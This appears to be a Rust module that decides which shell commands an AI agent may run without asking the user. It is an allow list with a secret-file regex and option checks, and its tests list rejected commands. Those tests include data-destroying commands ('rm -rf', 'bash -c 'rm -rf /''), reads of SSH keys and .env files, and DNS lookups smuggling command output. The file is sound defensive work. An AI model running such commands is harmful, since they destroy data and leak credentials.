//! Whether a command only looks: it lists, measures and reads, and changes
//! nothing, sends nothing and reads no secrets. An agent runs commands that
//! pass without asking the user first, so it can see the real machine; any
//! other command waits for the user's OK.
//!
//! It is an allow list: a program not named here doesn't pass, and the
//! options of those that are are read too, for the ones that write files or
//! run other programs. On this Mac, what passes also runs in macOS's
//! sandbox (see `fence::look_command`), which stops writes whatever this
//! missed.

use std::sync::LazyLock;

use regex::Regex;

use crate::shell::{self, Command};

/// Files that may hold secrets, never read when looking.
static SECRETS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(\.ssh/|id_(rsa|dsa|ecdsa|ed25519)|\.env(\.|$|/)|\.(pem|key|p12|pfx|keystore|jks|kdbx)$|\.aws/|\.azure/|\.config/gcloud|\.kube/config|\.docker/config|\.netrc|\.npmrc|\.pypirc|\.git-credentials|credentials|secrets?(\.|/|$)|/etc/shadow|/etc/sudoers|keychain|\.gnupg|token|password|\.vault|\.pgpass|\.my\.cnf|kubeconfig|\.ovpn$|\.tfstate|htpasswd|_history$|\.history$|wallet)",
    )
    .expect("secrets pattern")
});

/// Programs that talk to the network: what they send must be written out,
/// not filled in from files or other commands.
const NETWORK: &[&str] =
    &["dig", "host", "nslookup", "ping", "npm", "pnpm", "yarn", "brew", "kubectl", "pip", "pip3", "apt", "apt-cache", "dnf", "yum", "snap", "flatpak", "go"];

/// Whether a file may hold secrets, so it is never read without asking.
pub fn secret(path: &str) -> bool {
    SECRETS.is_match(path)
}

/// Whether `text` only looks, as it would run on a server: as `check`, and
/// git may not look at the working files there, where a repository's own
/// filters could run a program and no sandbox walls it in.
pub fn check_on_server(text: &str) -> Result<(), String> {
    check(text)?;
    let script = shell::parse(text);
    for command in script.commands.iter().filter(|command| command.name() == "git") {
        let args = past_git_options(&command.args);
        let flag = |names: &[&str]| args.iter().any(|arg| names.iter().any(|name| long(arg, name)));
        // Short options together, like `-md`.
        let short = |letters: &[char]| args.iter().any(|arg| arg.len() > 1 && arg.starts_with('-') && !arg.starts_with("--") && arg[1..].contains(letters));
        let reads_files = match args.first().map(String::as_str) {
            Some("status" | "diff" | "blame" | "grep") => true,
            Some("describe") => flag(&["--dirty", "--broken"]),
            Some("ls-files") => flag(&["--modified", "--deleted"]) || short(&['m', 'd']),
            Some("cat-file") => flag(&["--filters"]),
            _ => false,
        };
        if reads_files {
            return Err("`git` may not read the working files on a server without your OK".into());
        }
    }
    Ok(())
}

/// Whether `text` uses a program that talks to the network.
pub fn uses_network(text: &str) -> bool {
    shell::parse(text).commands.iter().any(|command| NETWORK.contains(&command.name()))
}

/// Whether `text` only looks. The error says why not, for the LLM.
pub fn check(text: &str) -> Result<(), String> {
    let script = shell::parse(text);
    if script.broken {
        return Err("it could not be read as shell code".into());
    }
    if script.functions {
        return Err("it defines functions".into());
    }
    if let Some(write) = script.writes.first() {
        return Err(format!("it writes to {} with >", write.target));
    }
    if script.commands.is_empty() {
        return Err("it runs nothing".into());
    }
    for command in &script.commands {
        if command.dynamic {
            return Err(format!("`{}` is only known when it runs", command.program));
        }
        if command.privileged() {
            return Err("looking never uses sudo".into());
        }
        if let Some(arg) = command.args.iter().find(|arg| SECRETS.is_match(arg)) {
            return Err(format!("{arg} may hold secrets"));
        }
        if NETWORK.contains(&command.name()) && command.args.iter().any(|arg| arg.contains(['$', '`']) || arg.contains("<(")) {
            return Err(format!("`{}` would send what another command made", command.name()));
        }
        looks(command).map_err(|why| format!("`{}` {why}", command.name()))?;
    }
    Ok(())
}

fn has(command: &Command, flags: &[&str]) -> bool {
    command.args.iter().any(|arg| flags.iter().any(|flag| arg == flag || arg.starts_with(&format!("{flag}="))))
}

/// Whether a short option, alone or with others like `-no`, is one of `letters`.
fn short(command: &Command, letters: &[char]) -> bool {
    command.args.iter().any(|arg| arg.len() > 1 && arg.starts_with('-') && !arg.starts_with("--") && arg[1..].chars().any(|c| letters.contains(&c)))
}

/// Whether an option is given, with or without its value: `--output`,
/// `--output=x`, or a short one with its value joined, `-ox`.
fn given(command: &Command, long: &[&str], letters: &[char]) -> bool {
    has(command, long) || short(command, letters)
}

/// The words that aren't options, leaving out the values of `valued` options.
fn positional<'a>(command: &'a Command, valued: &[&str]) -> Vec<&'a str> {
    let mut words = Vec::new();
    let mut skip = false;
    for arg in &command.args {
        if skip {
            skip = false;
        } else if valued.contains(&arg.as_str()) {
            skip = true;
        } else if !arg.starts_with('-') || arg == "-" {
            words.push(arg.as_str());
        }
    }
    words
}

/// The first word that isn't an option.
fn first_word(command: &Command) -> Option<&str> {
    command.args.iter().map(String::as_str).find(|arg| !arg.starts_with('-'))
}

fn only(command: &Command, allowed: &[&str]) -> Result<(), &'static str> {
    match first_word(command) {
        Some(word) if allowed.contains(&word) => Ok(()),
        None if command.args.iter().any(|arg| arg == "--version" || arg == "-v" || arg == "-V") => Ok(()),
        _ => Err("is only used to look here, like `list` or `status`"),
    }
}

/// Whether one command, wrappers seen through, only looks.
pub fn command_looks(command: &Command) -> bool {
    !command.dynamic && !command.privileged() && !command.args.iter().any(|arg| SECRETS.is_match(arg)) && looks(command).is_ok()
}

/// Whether one command only looks.
fn looks(command: &Command) -> Result<(), &'static str> {
    let args = &command.args;
    match command.name() {
        // Lists, sizes and text.
        "ls" | "du" | "df" | "stat" | "wc" | "head" | "tail" | "cat" | "grep" | "egrep" | "fgrep" | "cut" | "tr" | "column" | "nl" | "basename"
        | "dirname" | "realpath" | "readlink" | "pwd" | "cd" | "echo" | "printf" | "jq" | "md5" | "md5sum" | "shasum" | "sha1sum" | "sha256sum"
        | "cmp" | "diff" | "comm" | "strings" | "hexdump" | "od" | "true" | "false" | "test" | "[" | "[[" | "seq" | "expr" | "bc" | "fold"
        | "paste" | "join" | "tac" | "rev" => Ok(()),
        // These can write a file or run another program, with some options.
        "rg" if given(command, &["--pre", "--pre-glob", "--search-zip"], &['z']) => Err("may not run other programs on what it reads"),
        "sort" if given(command, &["--output", "--compress-program"], &['o']) => Err("may not write files"),
        "tree" if short(command, &['o', 'R']) => Err("may not write files"),
        "file" if given(command, &["--compile"], &['C']) => Err("may not write files"),
        "less" | "more" if given(command, &["--log-file", "--LOG-FILE"], &['o', 'O']) || command.args.iter().any(|arg| arg.starts_with('+')) => {
            Err("may not write files or run its own commands")
        }
        "uniq" if positional(command, &["-f", "-s", "-w", "--skip-fields", "--skip-chars", "--check-chars"]).len() > 1 => Err("may not write files"),
        "date" if has(command, &["-s", "--set"])
            || (!positional(command, &["-r", "-d", "-f", "-v", "--date", "--reference", "--file"]).iter().all(|word| word.starts_with('+'))
                && !has(command, &["-j", "-d", "--date", "-r", "--reference", "-f", "--file"])) =>
        {
            Err("may only show the date, not set it")
        }
        "hostname" if !positional(command, &[]).is_empty() => Err("may only show the name, not set it"),
        "rg" | "sort" | "tree" | "file" | "less" | "more" | "uniq" | "date" | "hostname" => Ok(()),
        // The machine.
        "uptime" | "uname" | "sw_vers" | "whoami" | "id" | "groups" | "which" | "type" | "whereis" | "ps" | "pgrep" | "free"
        | "lsblk" | "findmnt" | "vm_stat" | "getconf" | "locale" | "nproc" | "lscpu" | "lsof" | "netstat" | "ss" | "dig" | "host"
        | "nslookup" | "system_profiler" | "w" | "who" | "last" | "top" | "iostat" | "vmstat" | "mpstat" => Ok(()),
        "command" if has(command, &["-v", "-V"]) => Ok(()),
        "find" => match args.iter().find(|arg| {
            matches!(arg.as_str(), "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir" | "-fprint" | "-fprint0" | "-fprintf" | "-fls")
        }) {
            Some(_) => Err("may only list, not delete or run things"),
            None => Ok(()),
        },
        "sed" => sed(command),
        "awk" | "gawk" | "mawk" | "nawk" => {
            // A program from a file or an extension can't be read here.
            if has(command, &["-f", "--file", "-l", "--load", "-i", "--include", "-E", "--exec"])
                || args.iter().any(|arg| arg.contains("system(") || arg.contains('>') || arg.contains('|') || arg.contains("@load") || arg.contains("@include"))
            {
                Err("may not write files or run commands")
            } else {
                Ok(())
            }
        }
        "yq" if given(command, &["--inplace", "--split-exp"], &['i', 's']) => Err("may not change or write files"),
        "yq" => Ok(()),
        "sysctl" if has(command, &["-w"]) || args.iter().any(|arg| arg.contains('=')) => Err("may only read settings"),
        "sysctl" => Ok(()),
        "mount" | "ifconfig" if args.len() > 1 => Err("may only show, not change"),
        "mount" | "ifconfig" => Ok(()),
        "ip" if args.iter().any(|arg| matches!(arg.as_str(), "add" | "del" | "delete" | "set" | "flush" | "change" | "replace" | "append")) => {
            Err("may only show, not change")
        }
        "ip" => Ok(()),
        "ping" if has(command, &["-c"]) => Ok(()),
        "ping" => Err("needs -c, so it stops"),
        "crontab" if args.iter().all(|arg| arg == "-l" || arg == "-u" || !arg.starts_with('-')) && has(command, &["-l"]) => Ok(()),
        "crontab" => Err("may only list, with -l"),
        "journalctl" if args.iter().any(|arg| arg.starts_with("--vacuum") || arg == "--rotate" || arg == "--flush") => {
            Err("may only read logs")
        }
        "journalctl" => Ok(()),
        "diskutil" => only(command, &["list", "info", "apfs"]).and_then(|()| {
            if first_word(command) == Some("apfs") && !args.iter().any(|arg| arg == "list") { Err("may only list") } else { Ok(()) }
        }),
        "systemctl" => only(command, &["status", "list-units", "list-timers", "list-unit-files", "is-active", "is-enabled", "is-failed", "show", "cat"]),
        "service" if has(command, &["--status-all"]) || args.get(1).is_some_and(|word| word == "status") => Ok(()),
        "git" => git(command),
        "docker" | "podman" => only(command, &["ps", "images", "info", "version", "inspect", "stats", "system", "volume", "network", "container", "image"])
            .and_then(|()| {
                let words: Vec<&str> = args.iter().map(String::as_str).filter(|arg| !arg.starts_with('-')).collect();
                match words.as_slice() {
                    ["system", "df" | "info", ..] | ["volume" | "network" | "container" | "image", "ls" | "inspect", ..] => Ok(()),
                    ["system" | "volume" | "network" | "container" | "image", ..] => Err("may only list or inspect"),
                    ["stats", ..] if !has(command, &["--no-stream"]) => Err("needs --no-stream, so it stops"),
                    _ => Ok(()),
                }
            }),
        "kubectl" => only(command, &["get", "describe", "top", "logs", "version", "api-resources", "cluster-info"]),
        "brew" => match first_word(command) {
            Some("list" | "ls" | "info" | "config" | "outdated" | "leaves" | "deps" | "uses" | "search" | "--cache" | "--prefix") => Ok(()),
            Some("cleanup") if has(command, &["-n", "--dry-run"]) => Ok(()),
            _ if has(command, &["--cache", "--prefix", "--version"]) => Ok(()),
            _ => Err("may only list or show"),
        },
        "npm" | "pnpm" | "yarn" => match first_word(command) {
            Some("ls" | "list" | "outdated" | "view" | "info" | "root" | "prefix" | "why" | "explain") => Ok(()),
            Some("config") if args.iter().any(|arg| arg == "get" || arg == "list" || arg == "ls") => Ok(()),
            Some("cache") if args.iter().any(|arg| arg == "ls" || arg == "verify" || arg == "dir") => Ok(()),
            None if has(command, &["--version", "-v"]) => Ok(()),
            _ => Err("may only list or show"),
        },
        "pip" | "pip3" => match first_word(command) {
            Some("list" | "show" | "freeze") => Ok(()),
            Some("cache") if args.iter().any(|arg| matches!(arg.as_str(), "dir" | "list" | "info")) => Ok(()),
            None if has(command, &["--version", "-V"]) => Ok(()),
            _ => Err("may only list or show"),
        },
        // Their other commands can fetch, build, or write a lock file.
        "cargo" => only(command, &["version"]),
        "go" => only(command, &["env", "version"]),
        "apt" | "apt-cache" | "dnf" | "yum" => only(command, &["list", "show", "policy", "search", "info", "repolist", "depends", "rdepends"]),
        "dpkg" | "rpm" | "dpkg-query" => match args.first().map(String::as_str) {
            Some("-l" | "-L" | "-s" | "-S" | "--get-selections" | "-W" | "--list" | "--status") => Ok(()),
            Some(flag) if command.name() == "rpm" && flag.starts_with("-q") => Ok(()),
            _ => Err("may only list or show"),
        },
        "snap" | "flatpak" => only(command, &["list", "info"]),
        "python" | "python3" | "node" | "ruby" | "java" | "rustc" | "perl" | "php" => {
            if args.len() == 1 && matches!(args[0].as_str(), "--version" | "-V" | "-v" | "version") { Ok(()) } else { Err("may only say its version") }
        }
        "env" | "printenv" | "set" | "export" | "declare" => Err("would show secrets"),
        _ => Err("isn't one of the commands that only look"),
    }
}

/// git's words past the options that only name the folder or turn off the
/// pager, which may come before its command.
fn past_git_options(args: &[String]) -> &[String] {
    match args.first().map(String::as_str) {
        Some("-C") => past_git_options(args.get(2..).unwrap_or_default()),
        Some("--no-pager" | "-P") => past_git_options(&args[1..]),
        _ => args,
    }
}

/// Whether `arg` is the long option `name` or the start of it, which git
/// takes for the whole name.
fn long(arg: &str, name: &str) -> bool {
    let key = arg.split('=').next().unwrap_or(arg);
    key.len() > 2 && key.starts_with("--") && name.starts_with(key)
}

/// Options of `git log` that only pick and lay out commits. None shows a
/// change, so no program a repository names runs for them.
const LOG_PICKS: &[&str] = &[
    "--oneline", "--graph", "--decorate", "--no-decorate", "--all", "--branches", "--tags", "--remotes", "--reverse", "--first-parent", "--no-merges",
    "--merges", "--name-only", "--name-status", "--abbrev-commit", "--no-abbrev-commit", "--color", "--no-color", "--follow", "--date", "--relative-date",
    "--since", "--until", "--after", "--before", "--author", "--committer", "--grep", "--all-match", "--invert-grep", "--max-count", "-n", "--skip",
    "--format", "--pretty", "-i", "--regexp-ignore-case", "-E", "-F", "--fixed-strings", "--parents", "--children", "--left-right", "--boundary",
    "--topo-order", "--date-order", "--author-date-order", "--ancestry-path", "--source", "--use-mailmap", "--no-walk", "-z", "--full-history",
    "--simplify-by-decoration", "--cherry-pick", "--cherry-mark", "--not", "--glob", "--exclude", "--min-parents", "--max-parents", "-g", "--walk-reflogs",
];

/// Whether a `git log` only picks and lays out commits, as `LOG_PICKS`.
fn log_only_picks(args: &[String]) -> bool {
    let number = |text: &str| text.bytes().all(|b| b.is_ascii_digit());
    args.iter().take_while(|arg| *arg != "--").filter(|arg| arg.starts_with('-')).all(|arg| {
        LOG_PICKS.contains(&arg.split('=').next().unwrap_or(arg)) || number(&arg[1..]) || arg.strip_prefix("-n").is_some_and(number)
    })
}

fn git(command: &Command) -> Result<(), &'static str> {
    // No option but those may come before the command, as `-c` and the like
    // change what git runs.
    let command = &Command { args: past_git_options(&command.args).to_vec(), ..command.clone() };
    match command.args.first().map(String::as_str) {
        Some("--version") if command.args.len() == 1 => return Ok(()),
        Some(first) if first.starts_with('-') => return Err("may not take options before its command here"),
        _ => {}
    }
    let words: Vec<&str> = command.args.iter().map(String::as_str).filter(|arg| !arg.starts_with('-')).collect();
    let flags = |list: &[&str]| command.args.iter().any(|arg| list.contains(&arg.as_str()));
    // git takes the start of a long option for all of it, so `--outp` is
    // `--output`; `--text` is an option of its own.
    let runs = ["--output", "--ext-diff", "--textconv", "--open-files-in-pager", "--exec", "--upload-pack", "--receive-pack"];
    if command.args.iter().any(|arg| arg != "--text" && runs.iter().any(|name| long(arg, name))) || command.args.iter().any(|arg| arg.starts_with("-O")) {
        return Err("may not write files or run other programs");
    }
    let log = matches!(words.as_slice(), ["log" | "whatchanged" | "reflog", ..] | ["stash", "list", ..]);
    // Diffs of a merge made again may run the repository's merge programs.
    if (log || words.first() == Some(&"show"))
        && command.args.iter().any(|arg| arg == "-m" || long(arg, "--diff-merges") || long(arg, "--remerge-diff"))
    {
        return Err("may not show a merge's changes made again");
    }
    // A repository's own settings can run a program to show a change, so
    // showing changes needs those turned off.
    let shows_changes = matches!(words.first(), Some(&("diff" | "show"))) || (log && !log_only_picks(&command.args));
    if shows_changes && !(flags(&["--no-ext-diff"]) && flags(&["--no-textconv"])) {
        return Err("may show changes only with --no-ext-diff --no-textconv");
    }
    if words.first() == Some(&"blame") && !flags(&["--no-textconv"]) {
        return Err("may blame only with --no-textconv");
    }
    // Only options that list.
    let lists = |picks: &[&str]| {
        command.args.iter().filter(|arg| arg.starts_with('-')).all(|arg| picks.contains(&arg.split('=').next().unwrap_or(arg)) || arg.starts_with("-n"))
    };
    match words.as_slice() {
        ["status" | "log" | "diff" | "show" | "ls-files" | "check-ignore" | "rev-parse" | "describe" | "shortlog" | "blame" | "ls-tree" | "cat-file"
        | "count-objects" | "for-each-ref" | "show-ref" | "grep" | "merge-base" | "rev-list" | "whatchanged", ..] => Ok(()),
        ["reflog", rest @ ..] if !matches!(rest.first(), Some(&("expire" | "delete" | "drop" | "write"))) => Ok(()),
        // Names after them are patterns only with --list.
        ["branch", rest @ ..]
            if lists(&["-a", "-r", "-v", "-vv", "-l", "--list", "--all", "--remotes", "--verbose", "--show-current", "--sort", "--format", "--color", "--no-color", "--column", "--no-column", "-i", "--ignore-case"])
                && (rest.is_empty() || flags(&["-l", "--list"])) =>
        {
            Ok(())
        }
        ["tag", rest @ ..]
            if lists(&["-l", "--list", "--sort", "--format", "--color", "--column", "--no-column", "-i", "--ignore-case"]) && (rest.is_empty() || flags(&["-l", "--list"])) =>
        {
            Ok(())
        }
        // `show` without -n asks the remote, which can run a program.
        ["remote"] | ["remote", "get-url", ..] => Ok(()),
        ["remote", "show", ..] if flags(&["-n"]) => Ok(()),
        ["config", ..] if flags(&["--get", "--get-all", "-l", "--list", "--get-regexp"]) => Ok(()),
        ["stash", "list"] | ["worktree", "list"] => Ok(()),
        [] if flags(&["--version"]) => Ok(()),
        _ => Err("may only look, like `status`, `log` or `check-ignore`"),
    }
}

/// sed that only prints: no editing in place, no script from a file, and
/// no command or `s` flag that writes a file or runs one (`w`, `W`, `e`).
fn sed(command: &Command) -> Result<(), &'static str> {
    let mut scripts: Vec<&str> = Vec::new();
    let mut files = false;
    let mut args = command.args.iter().map(String::as_str);
    while let Some(arg) = args.next() {
        match arg {
            "-e" | "--expression" => scripts.push(args.next().ok_or("is missing its script")?),
            "--quiet" | "--silent" | "--posix" | "--regexp-extended" | "--unbuffered" | "--null-data" | "--separate" | "--debug" | "--sandbox" => {}
            _ if arg.starts_with("--expression=") => scripts.push(&arg["--expression=".len()..]),
            _ if arg.starts_with("--") => return Err("may only print, with options it knows"),
            _ if arg.len() > 1 && arg.starts_with('-') => {
                // Options together, like -nE; an `e` last takes the next word as the script.
                let letters = &arg[1..];
                let (letters, script_next) = match letters.strip_suffix('e') {
                    Some(rest) => (rest, true),
                    None => (letters, false),
                };
                if !letters.chars().all(|c| matches!(c, 'n' | 'E' | 'r' | 'u' | 'z' | 's')) {
                    return Err("may not change files or read its script from a file");
                }
                if script_next {
                    scripts.push(args.next().ok_or("is missing its script")?);
                }
            }
            _ if scripts.is_empty() && !files => scripts.push(arg),
            _ => files = true,
        }
    }
    if scripts.iter().all(|script| sed_prints(script)) { Ok(()) } else { Err("may not write files or run things") }
}

/// Whether a sed script only prints: each command is one that reads,
/// prints or edits what flows through, never `w`, `W` or `e`, and no `s`
/// with the `w` or `e` flag.
fn sed_prints(script: &str) -> bool {
    let chars: Vec<char> = script.chars().collect();
    let mut at = 0;
    // Past a regex or replacement that ends with `end`, escapes skipped.
    let past = |at: &mut usize, end: char| -> bool {
        while let Some(&c) = chars.get(*at) {
            *at += 1;
            if c == '\\' {
                *at += 1;
            } else if c == end {
                return true;
            }
        }
        false
    };
    let to_line_end = |at: &mut usize| {
        while chars.get(*at).is_some_and(|c| *c != '\n') {
            *at += 1;
        }
    };
    while let Some(&c) = chars.get(at) {
        match c {
            ' ' | '\t' | '\n' | ';' | '{' | '}' | '!' | ',' | '$' | '~' | '+' | '0'..='9' => at += 1,
            '/' => {
                at += 1;
                if !past(&mut at, '/') {
                    return false;
                }
                while chars.get(at).is_some_and(|c| matches!(c, 'I' | 'M')) {
                    at += 1;
                }
            }
            '\\' => {
                let Some(&end) = chars.get(at + 1) else { return false };
                at += 2;
                if !past(&mut at, end) {
                    return false;
                }
            }
            's' | 'y' => {
                let Some(&end) = chars.get(at + 1).filter(|end| !matches!(end, '\n' | '\\')) else { return false };
                at += 2;
                if !past(&mut at, end) || !past(&mut at, end) {
                    return false;
                }
                if c == 's' {
                    while let Some(&flag) = chars.get(at) {
                        match flag {
                            'g' | 'p' | 'i' | 'I' | 'm' | 'M' | '0'..='9' => at += 1,
                            'e' | 'w' | 'W' => return false,
                            _ => break,
                        }
                    }
                }
            }
            'e' | 'w' | 'W' => return false,
            // Text to add, a file to read, or a label: the rest of the line.
            'a' | 'i' | 'c' | 'r' | 'R' | 'b' | 't' | 'T' | ':' => to_line_end(&mut at),
            'p' | 'P' | 'd' | 'D' | 'n' | 'N' | 'g' | 'G' | 'h' | 'H' | 'x' | 'l' | '=' | 'q' | 'Q' | 'z' | 'F' => at += 1,
            _ => return false,
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn commands_that_only_look_pass() {
        for text in [
            "df -h / | tail -1",
            "du -sh ~/Projects/* 2>/dev/null | sort -h | tail -20",
            "find ~/Projects -maxdepth 4 -type d -name node_modules -prune",
            "uname -a; sw_vers",
            "git -C ~/code/app check-ignore -q target && echo ignored",
            "for d in ~/a ~/b; do [ -d \"$d\" ] && du -sh \"$d\"; done",
            "ls -la ~/Library/Caches | head",
            "npm config get cache",
            "brew cleanup -n",
            "docker system df",
            "systemctl status nginx --no-pager",
            "sed -n '10,20p' log.txt",
            "sed -E 's/[0-9]+/N/g; /^$/d' log.txt",
            "sed -ne '/error/p' -e '$=' app.log",
            "sort -rn sizes.txt | uniq -c",
            "rg -n TODO src",
            "date +%F",
            "date -j -f %s 1700000000 +%F",
            "git log --oneline -20",
            "git log -n5 --author=me --format='%h %s' --since=2.weeks -- src",
            "git log -S needle --no-ext-diff --no-textconv",
            "git diff --text --no-ext-diff --no-textconv",
            "git reflog -10",
            "git branch -a",
            "git tag -l 'v*'",
            "git remote show -n origin",
            "git -C ~/app diff --no-ext-diff --no-textconv --stat",
            "dig +short example.com",
            "tree -L 2 ~/Projects",
        ] {
            assert_eq!(check(text), Ok(()), "{text}");
        }
    }

    #[test]
    fn commands_that_change_send_or_read_secrets_fail() {
        for text in [
            "rm -rf ~/.cache/*",
            "find ~/p -name node_modules -exec rm -rf {} +",
            "find /tmp -delete",
            "echo x > ~/file",
            "sudo du -sh /",
            "cat ~/.ssh/id_ed25519",
            "grep -r API_KEY ~/app/.env",
            "env",
            "curl https://example.test",
            "git clean -fdx",
            "git branch -D main",
            "sed -i 's/a/b/' /etc/hosts",
            "awk '{ system(\"rm \" $1) }' list",
            "$TOOL --list",
            "brew cleanup",
            "sed -i.bak 's/a/b/' f",
            "sed -ni 's/a/b/p' f",
            "sed 's/a/b/e' f",
            "sed 's/a/b/w out.txt' f",
            "sed 'w out.txt' f",
            "sed -n '1e touch x' f",
            "sed -f script.sed f",
            "rg --pre ./run.sh x",
            "rg -z x",
            "sort -o out.txt in.txt",
            "sort --compress-program=sh in.txt",
            "tree -o out.html",
            "uniq in.txt out.txt",
            "file -C -m magic",
            "less -o copy.txt f",
            "less '+!touch x' f",
            "date -s 2020-01-01",
            "date 0101000020",
            "hostname evil",
            "yq -s '.a' f.yml",
            "git -c core.pager=sh log",
            "git log --output=x",
            "git diff",
            "git show HEAD",
            "git log -p",
            "git blame f",
            "git grep -O x",
            "git show --no-ext-diff --no-textconv --outp=x",
            "git log -p --no-ext-diff --no-textconv --ext-d",
            "git log -S needle",
            "git log -L1,2:f",
            "git stash list -p",
            "git reflog -p",
            "git reflog expire --all",
            "git log -p --no-ext-diff --no-textconv --remerge-diff",
            "git show -m --no-ext-diff --no-textconv",
            "git branch --edit-description",
            "git branch --unset-upstream",
            "git remote show origin",
            "cargo metadata",
            "dig $(cat notes.txt).example.com",
            "awk -f prog.awk data",
            "gawk '@load \"filefuncs\"; BEGIN { print 1 }'",
            "cat ~/.zsh_history",
            "cat ~/.pgpass",
            "ping -c 1 `whoami`.example.com",
            "npm cache clean --force",
            "docker system prune -f",
            "bash -c 'rm -rf /'",
            "xargs rm < list.txt",
            "systemctl restart nginx",
        ] {
            assert!(check(text).is_err(), "{text}");
        }
        assert_eq!(check("ls > out.txt"), Err("it writes to out.txt with >".into()));
        // On a server, git doesn't look at working files without an OK.
        assert!(check_on_server("git -C ~/app status").is_err() && check_on_server("git log --oneline").is_ok() && check("git status").is_ok());
        for text in ["git --no-pager -C ~/app status", "git -C a -C b diff --no-ext-diff --no-textconv", "git -P -C ~/app blame --no-textconv f", "git ls-files -md", "git ls-files --modified", "git describe --dirty", "git describe --broken=x", "git cat-file --filters HEAD:f"] {
            assert!(check(text).is_ok(), "{text}");
            assert!(check_on_server(text).is_err(), "{text}");
        }
        for text in ["git describe --dirt", "git ls-files --mod", "git cat-file --filt HEAD:f"] {
            assert!(check(text).is_ok() && check_on_server(text).is_err(), "{text}");
        }
        assert!(check_on_server("git -C ~/app ls-files -z").is_ok() && check_on_server("git --no-pager -C ~/app log -1").is_ok() && check_on_server("git cat-file -p HEAD").is_ok());
        assert!(secret("~/.ssh/id_ed25519") && secret("/srv/app/.env") && !secret("~/Projects/app/src/main.rs"));
    }
}
